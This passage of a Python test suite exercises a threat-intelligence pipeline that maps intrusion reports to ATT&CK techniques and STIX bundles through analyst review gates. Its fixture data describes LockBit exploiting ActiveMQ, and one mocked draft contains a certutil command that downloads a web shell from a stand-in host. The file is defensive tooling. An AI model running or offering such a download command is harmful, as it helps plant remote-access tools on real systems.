        assert removed_key in control_edges, "fixture sanity: edge must exist first"
        assert removed_key not in after_edges, (
            f"analyst removed {removed_key} at gate_2 but it shipped anyway"
        )
        assert len(after_edges) == len(control_edges) - 1, (
            "exactly one edge should disappear"
        )

    async def test_gate2_preview_ids_survive_renormalize(
        self, sample_entities, sample_drafts,
    ):
        """Preview ids are content-derived, so a normalize re-run is stable.

        The old positional `relp_N` counter renumbered on every pass, which
        meant a recorded removal silently re-mapped onto a different edge.
        """
        state = {
            "gates_enabled": True,
            "metadata": {},
            "source_reliability": 85,
            "validated_entities": sample_entities,
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
        }
        first = normalize(state)["relationship_preview"]
        second = normalize(state)["relationship_preview"]

        def keyed(preview):
            return {
                r["id"]: (r["source_name"], r["relationship_type"], r["target_name"])
                for r in preview
            }

        assert keyed(first) == keyed(second)
        assert all(r["id"].startswith("relp_") for r in first)
        assert len({r["id"] for r in first}) == len(first), "ids must be unique"


# =============================================================================
# Test 4: Rejection loop simulation
# =============================================================================

class TestRejectionLoop:
    """Simulate Gate 1 rejection -> re-process -> re-gate flow."""

    @pytest.fixture
    def mid_pipeline_state(self, sample_text):
        """State midway through the pipeline, ready for Gate 1."""
        entities = [
            asdict(Entity(
                entity_id="ent-rl-001",
                entity_type=EntityType.INTRUSION_SET.value,
                value="LockBit 3.0",
                confidence=0.92,
                gate_action=GateAction.APPROVE.value,
            )),
        ]
        chunks = [
            asdict(Chunk(
                chunk_id="chk-rl-001",
                text="Exploited ActiveMQ for initial access.",
                sequence_index=1,
                behavioral_confidence=0.85,
            )),
            asdict(Chunk(
                chunk_id="chk-rl-002",
                text="Downloaded web shell and executed Cobalt Strike beacon.",
                sequence_index=2,
                predecessor_indices=[1],
                behavioral_confidence=0.80,
            )),
        ]
        drafts = [
            asdict(ProcedureDraft(
                draft_id="dft-rl-001", chunk_id="chk-rl-001",
                name="Exploit ActiveMQ", description="Exploited vulnerability.",
                techniques=[TechniqueMapping(
                    technique_id="T1190", technique_name="Exploit Public-Facing Application",
                    tactic="initial-access", confidence=0.9,
                )],
                confidence=85, sequence_index=1,
            )),
            asdict(ProcedureDraft(
                draft_id="dft-rl-002", chunk_id="chk-rl-002",
                name="Download shell and beacon", description="Two actions in one chunk.",
                techniques=[TechniqueMapping(
                    technique_id="T1105", technique_name="Ingress Tool Transfer",
                    tactic="command-and-control", confidence=0.75,
                )],
                confidence=72, sequence_index=2, predecessor_indices=[1],
            )),
        ]
        return {
            "source_id": "src-rl-001",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "parsed_text": sample_text,
            "metadata": {"author": "Test"},
            "source_reliability": 80,
            "gates_enabled": True,
            "entities": entities,
            "validated_entities": entities,
            "detection_rules": [],
            "classified_sections": [],
            "chunks": chunks,
            "technique_mappings": {
                "chk-rl-001": [asdict(TechniqueMapping(
                    technique_id="T1190", technique_name="Exploit Public-Facing Application",
                    tactic="initial-access", confidence=0.9,
                ))],
                "chk-rl-002": [asdict(TechniqueMapping(
                    technique_id="T1105", technique_name="Ingress Tool Transfer",
                    tactic="command-and-control", confidence=0.75,
                ))],
            },
            "drafts": drafts,
        }

    def test_bad_chunk_rejection_routes_to_rechunk(self, mid_pipeline_state):
        """Analyst rejects for BAD_CHUNK_BOUNDARY -> routes to chunk_behaviors."""
        reviews = [
            {"draft_id": "dft-rl-001", "action": "approve"},
            {
                "draft_id": "dft-rl-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.BAD_CHUNK_BOUNDARY.value,
                "rationale": "This should be two separate procedures: download + execute",
            },
        ]
        mid_pipeline_state["gate1_reviews"] = reviews

        # Run Gate 1
        result = gate_1(mid_pipeline_state)
        state = _merge_state(mid_pipeline_state, result)

        assert state["gate1_rejection_routing"] == "chunk_behaviors"
        assert "dft-rl-002" not in state["gate1_approved_draft_ids"]

        # Verify routing function agrees
        assert route_after_gate_1(state) == "chunk_behaviors"

    def test_wrong_technique_rejection_routes_to_extract(self, mid_pipeline_state):
        """Analyst rejects for WRONG_TECHNIQUE -> routes to extract_techniques."""
        reviews = [
            {"draft_id": "dft-rl-001", "action": "approve"},
            {
                "draft_id": "dft-rl-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
                "rationale": "T1105 is wrong, should be T1059.003",
            },
        ]
        mid_pipeline_state["gate1_reviews"] = reviews

        result = gate_1(mid_pipeline_state)
        state = _merge_state(mid_pipeline_state, result)

        assert state["gate1_rejection_routing"] == "extract_techniques"
        assert route_after_gate_1(state) == "extract_techniques"

    async def test_rejection_then_reprocess_then_approve(self, mid_pipeline_state):
        """Full rejection loop: reject -> re-extract -> re-draft -> approve.

        The only path where a node runs TWICE on the same state, so it is
        where stale-state bugs surface: the second extraction must actually
        REPLACE the rejected mapping, not merge alongside it.

        C+A+D turned technique extraction into two LLM
        calls (propose, then pick), so a single return_value no longer works
        — the propose call would receive the pick payload and fail
        validation. The dispatcher below keeps the corrected pick payload
        this test is actually about while letting propose answer normally.
        """
        def _corrected_llm(*args, **kwargs):
            tool_choice = kwargs.get("tool_choice", {}) or {}
            tool = tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""
            if tool == "extract_techniques":
                return corrected_technique_response
            if tool == "draft_procedures":
                return corrected_draft_response
            return _llm_dispatch(*args, **kwargs)

        # Pass 1: Analyst rejects for wrong technique
        reviews_pass1 = [
            {"draft_id": "dft-rl-001", "action": "approve"},
            {
                "draft_id": "dft-rl-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
            },
        ]
        mid_pipeline_state["gate1_reviews"] = reviews_pass1

        result = gate_1(mid_pipeline_state)
        state = _merge_state(mid_pipeline_state, result)
        assert route_after_gate_1(state) == "extract_techniques"

        # Simulate re-extraction with corrected technique
        corrected_technique_response = _make_llm_response({
            "chunk_techniques": [
                {
                    "chunk_id": "chk-rl-001",
                    "techniques": [{
                        "technique_id": "T1190",
                        "technique_name": "Exploit Public-Facing Application",
                        "tactic": "initial-access",
                        "confidence": 0.90,
                        # C+A+D fields. `rationale` is required, and
                        # `source_quote` must appear VERBATIM in the chunk
                        # text or the pick is auto-demoted to the review
                        # lane and never reaches technique_mappings.
                        "confidence_bucket": "definite",
                        "source_quote": "Exploited ActiveMQ for initial access.",
                        "rationale": "The chunk states the ActiveMQ exploit directly.",
                    }],
                },
                {
                    "chunk_id": "chk-rl-002",
                    "techniques": [{
                        "technique_id": "T1059.003",
                        "technique_name": "Windows Command Shell",
                        "tactic": "execution",
                        "confidence": 0.88,
                        "confidence_bucket": "definite",
                        "source_quote": "Downloaded web shell and executed Cobalt Strike beacon.",
                        "rationale": "Analyst-corrected mapping: shell execution, not the original pick.",
                    }],
                },
            ],
        })

        with patch("app.nodes.llm.technique_extraction.call_llm",
                   new_callable=AsyncMock, side_effect=_corrected_llm):
            result = await extract_techniques(state)
        state = _merge_state(state, result)

        # Verify corrected technique
        assert "chk-rl-002" in state["technique_mappings"]
        mappings = state["technique_mappings"]["chk-rl-002"]
        assert any(m["technique_id"] == "T1059.003" for m in mappings)

        # Re-draft with corrected techniques
        corrected_draft_response = _make_llm_response({
            "drafts": [
                {
                    "chunk_id": "chk-rl-001",
                    "name": "Exploit ActiveMQ via CVE-2023-46604",
                    "description": "Exploited the RCE vulnerability.",
                    "platforms": ["windows::server"],
                    "command_lines": [],
                    "confidence": 85,
                },
                {
                    "chunk_id": "chk-rl-002",
                    "name": "Execute commands via Windows Command Shell",
                    "description": "Used cmd.exe to download web shell and execute beacon.",
                    "platforms": ["windows::server"],
                    "command_lines": ["cmd.exe /c certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
                    "confidence": 82,
                },
            ],
        })

        with patch("app.nodes.llm.drafting.call_llm",
                   new_callable=AsyncMock, side_effect=_corrected_llm):
            result = await draft_procedures(state)
        state = _merge_state(state, result)
        assert len(state["drafts"]) == 2

        # Pass 2: Analyst approves everything
        reviews_pass2 = [
            {"draft_id": state["drafts"][0]["draft_id"], "action": "approve"},
            {"draft_id": state["drafts"][1]["draft_id"], "action": "approve"},
        ]
        state["gate1_reviews"] = reviews_pass2

        result = gate_1(state)
        state = _merge_state(state, result)

        assert state["gate1_rejection_routing"] is None
        assert len(state["gate1_approved_draft_ids"]) == 2
        assert route_after_gate_1(state) == "normalize"

        # Continue through normalize -> gate_2 -> serialize
        result = normalize(state)
        state = _merge_state(state, result)
        assert len(state["normalized_drafts"]) == 2

        state["gate2_review"] = {"approved": True}
        result = gate_2(state)
        state = _merge_state(state, result)
        assert state["gate2_decision"]["approved"] is True

        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            result = await serialize_stix(state)
        state = _merge_state(state, result)
        assert state["stix_bundle"]["type"] == "bundle"
        assert len([o for o in state["stix_bundle"]["objects"] if o["type"] == "x-procedure"]) == 2

    async def test_gate2_rejection_loop(self, sample_entities, sample_drafts):
        """Gate 2 reject -> normalize again -> approve -> serialize.

        The rejection loop is the one path where a node runs TWICE on the
        same state, so it is where in-place mutation bugs surface. Skipped
        since serialize_stix became async; restored.
        """
        state = {
            "gates_enabled": True,
            "metadata": {"author": "Test"},
            "source_reliability": 80,
            "validated_entities": sample_entities,
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
        }

        # First normalize pass
        result = normalize(state)
        state = _merge_state(state, result)

        # Gate 2: reject
        state["gate2_review"] = {"approved": False, "feedback": "Missing relationship"}
        result = gate_2(state)
        state = _merge_state(state, result)

        assert state["gate2_decision"]["approved"] is False
        assert route_after_gate_2(state) == "normalize"

        # Re-normalize (simulates fixing the issue)
        result = normalize(state)
        state = _merge_state(state, result)

        # Gate 2: approve
        state["gate2_review"] = {"approved": True}
        result = gate_2(state)
        state = _merge_state(state, result)

        assert state["gate2_decision"]["approved"] is True
        assert route_after_gate_2(state) == "serialize_stix"

        # Serialize succeeds
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            result = await serialize_stix(state)
        state = _merge_state(state, result)
        assert state["stix_bundle"]["type"] == "bundle"
